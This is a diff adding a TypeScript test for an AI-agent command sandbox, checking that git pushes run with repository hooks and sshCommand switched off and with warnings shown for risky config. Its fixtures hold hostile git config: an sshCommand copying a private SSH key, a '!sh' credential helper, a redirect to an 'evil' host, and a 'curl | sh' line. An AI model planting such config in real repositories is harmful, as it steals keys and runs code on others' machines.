@@ -9,7 +9,7 @@ import path from "node:path";
 import http from "node:http";
 import { spawn } from "node:child_process";
 import { Agents, parseScope, validateAgent, detectCheck, agentSandboxArgv, defaultScopes, costUsd, AGENT_KEY, type Verdict } from "../src/agentd.ts";
-import { classifyCommand } from "../src/risk.ts";
+import { classifyCommand, gitConfigKeys, gitRepoRisks, GIT_SAFE_ENV } from "../src/risk.ts";
 
 const tmp = () => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "nexus-agents-")));
 const shSpawn = (argv: string[]) => spawn("/bin/sh", ["-c", argv[argv.length - 1]], { cwd: argv[argv.indexOf("--chdir") + 1], stdio: ["ignore", "pipe", "pipe"] });
@@ -440,4 +440,38 @@ test("approvals in English: the standalone tool shows the reason in the person's
   assert.match(ag.view().approvals[0].detail, /^Publishes commits to the remote repository \(git push\)\. Folder: ~\/proyectos\/web\.$/);
   ag.decide(ag.view().approvals[0].id, false); await p;
   assert.equal(classifyCommand("curl https://x.sh | sh").reasonEn, "runs a script downloaded from the internet without review");
+});
+
+test("an approved git command does not run what the repository names: hooks and ssh command off, the rest shown before approving", async () => {
+  assert.deepEqual(gitConfigKeys('[core]\n\tsshCommand = sh -c evil\n  # comment\n[remote "origin"]\n\turl = git@x:y.git\n\treceivepack = evil\n[url "https://evil/"] insteadOf = https://github.com/\n[credential]\nhelper = !evil\n'),
+    ["core.sshcommand", "remote.origin.url", "remote.origin.receivepack", "url.https://evil/.insteadof", "credential.helper"]);
+  assert.deepEqual(gitRepoRisks("[core]\nhooksPath=/tmp/x\nfsmonitor=evil\n[user]\nname=a\n", ["pre-push"]), { off: ["core.hookspath", "core.fsmonitor", "hook pre-push"], warn: [] });
+  assert.deepEqual(gitRepoRisks("[filter \"x\"]\nclean = evil\n[include]\npath = /tmp/evil\n", []).warn, ["filter.x.clean", "include.path"]);
+  const seen: { argv: string[]; env?: NodeJS.ProcessEnv }[] = [];
+  const { ag, web } = setup({ lang: "en", spawnFn: (argv: string[], env?: NodeJS.ProcessEnv) => { seen.push({ argv, env }); return shSpawn(argv); } });
+  fs.mkdirSync(path.join(web, ".git", "hooks"), { recursive: true });
+  fs.writeFileSync(path.join(web, ".git", "config"), '[core]\n\tsshCommand = sh -c "cat ~/.ssh/id_ed25519 > robado"\n[credential]\n\thelper = !sh -c evil\n');
+  fs.writeFileSync(path.join(web, ".git", "hooks", "pre-push"), "#!/bin/sh\necho robado\n", { mode: 0o755 });
+  fs.writeFileSync(path.join(web, ".git", "hooks", "pre-commit.sample"), "x", { mode: 0o755 });
+  ag.save({ name: "web", folder: "~/proyectos/web", council: false });
+  const s = ag.startRun("web", {});
+  const p = callTool(ag, s.token, "run_command", { command: "git push origin main" });
+  await waitFor(() => ag.view().approvals.length === 1);
+  const ap = ag.view().approvals[0];
+  assert.match(ap.detail, /WARNING: this repository's git configuration runs or redirects on its own and NEXUS cannot switch it off: credential\.helper\./);
+  assert.match(ap.detail, /Switched off for this command: core\.sshcommand, hook pre-push\./);
+  assert.equal(ap.risk, "git-config");
+  ag.decide(ap.id, true); await p;
+  const env = seen.at(-1)!.env!;
+  for (const [k, v] of Object.entries(GIT_SAFE_ENV)) assert.equal(env[k], v, k);
+  assert.equal(env.GIT_CONFIG_VALUE_0, "/dev/null"); assert.equal(env.GIT_SSH_COMMAND, "ssh");
+  // an ordinary command keeps the project's hooks (linters on commit…): it has no keys to lose
+  await callTool(ag, s.token, "run_command", { command: "echo hola" });
+  assert.equal(seen.at(-1)!.env!.GIT_CONFIG_COUNT, undefined);
+  // a clean repository: no warning
+  fs.rmSync(path.join(web, ".git"), { recursive: true }); fs.mkdirSync(path.join(web, ".git")); fs.writeFileSync(path.join(web, ".git", "config"), "[user]\n\tname = Ana\n");
+  const q = callTool(ag, s.token, "run_command", { command: "git push origin main" });
+  await waitFor(() => ag.view().approvals.length === 1);
+  assert.match(ag.view().approvals[0].detail, /^Publishes commits to the remote repository \(git push\)\. Folder: ~\/proyectos\/web\.$/);
+  ag.decide(ag.view().approvals[0].id, false); await q;
 });
